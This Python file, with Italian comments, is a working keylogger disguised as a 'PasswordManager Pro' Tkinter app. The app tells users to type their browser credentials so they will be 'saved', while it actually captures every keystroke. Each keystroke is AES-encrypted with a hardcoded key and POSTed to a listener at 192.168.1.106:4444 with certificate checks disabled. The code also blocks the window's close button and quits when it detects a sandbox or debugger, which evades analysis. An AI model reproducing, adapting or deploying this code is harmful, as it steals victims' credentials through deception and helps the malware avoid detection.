import ssl
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import os
import time
import sys
import threading
import http.client
import ctypes  # Per il rilevamento del debugger
from Crypto.Cipher import AES  # Per la cifratura AES
import base64  # Per codificare/decodificare i dati

# Configurazione del server
HOST = "192.168.1.106"
PORT = 4444

# Contesto SSL senza verifica
context = ssl._create_unverified_context()

AES_KEY = bytes.fromhex("3a7d4f8e1b2c6d9a0f5e4c8a9b3d2e1f")  #chiave

# Funzione per cifrare
def encrypt(plaintext):
    cipher = AES.new(AES_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

# Funzione per verificare se siamo in un ambiente sandbox
def is_sandbox():
    sandbox_env_vars = ["SANDBOX", "VMWARE", "VBOX"]
    for var in sandbox_env_vars:
        if os.getenv(var):
            return True
    return False

# Funzione per rilevare se un debugger è attivo
def is_debugging():
    try:
        # Controlla se un debugger è attivo (solo per Windows)
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except:
        # Se non siamo su Windows, restituisci False
        return False

# Funzione per inviare i dati al server
def send_data_via_http(data):
    try:
        conn = http.client.HTTPSConnection(HOST, PORT, context=context)
        headers = {"Content-Type": "text/plain"}
        conn.request("POST", "/", data, headers)
        response = conn.getresponse()
        print(f"Risposta dal server: {response.status} {response.reason}")
        conn.close()
    except Exception as e:
        print(f"Errore nell'invio dei dati: {e}")

# Funzione per registrare i tasti premuti
def on_press(key):
    try:
        key_data = str(key.char)  # Ottieni il carattere del tasto premuto
    except AttributeError:
        key_data = str(key)  # Se non è un carattere (es. tasto speciale), usa la rappresentazione del tasto
    
    # Cifra i dati prima di inviarli
    encrypted_data = encrypt(key_data)
    send_data_via_http(encrypted_data)

# Funzione per bloccare l'esecuzione dopo 30 secondi
def stop_execution():
    time.sleep(30)
    
    # Invia il messaggio 'inviocompletato' al server prima di fermarsi
    send_data_via_http('inviocompletato')
    
    print("Tempo scaduto, chiusura del programma.")
    os._exit(0)

# Funzione per avviare la registrazione dei tasti
def start_memorization():
    messagebox.showinfo("Avvio", "La memorizzazione sicura delle password è attiva. Procedi con l'inserimento delle credenziali nel browser.")
    
    # Avvia il listener della tastiera in un thread separato
    listener_thread = threading.Thread(target=listener_task, daemon=True)
    listener_thread.start()
    
    # Avvia il timer per lo stop dopo 30 secondi
    stop_thread = threading.Thread(target=stop_execution, daemon=True)
    stop_thread.start()

# Funzione per il listener della tastiera
def listener_task():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Creazione della finestra principale
root = tk.Tk()
root.title("PasswordManager Pro")
root.geometry("400x300")
root.configure(bg="white")

# Disabilita il pulsante di chiusura della finestra
root.protocol("WM_DELETE_WINDOW", lambda: None)

title_label = tk.Label(root, text="PasswordManager Pro", font=("Arial", 20), bg="white", fg="#4CAF50")
title_label.pack(pady=20)

instructions_label = tk.Label(
    root,
    text="Avvia la memorizzazione sicura delle password cliccando il tasto qui sotto.\n"
         "Successivamente, vai sul tuo browser, accedi al sito interessato e inserisci le credenziali.\n"
         "Automaticamente verranno salvate.",
    font=("Arial", 12),
    bg="white",
    fg="#333",
    wraplength=350
)
instructions_label.pack(pady=20)

start_button = tk.Button(
    root,
    text="Avvia Memorizzazione",
    font=("Arial", 14),
    bg="#4CAF50",
    fg="white",
    command=start_memorization
)
start_button.pack(pady=20)

# Avvio dell'interfaccia grafica
if not is_sandbox() and not is_debugging():
    root.mainloop()
else:
    print("Rilevata sandbox o debugger, uscita...")
    sys.exit()
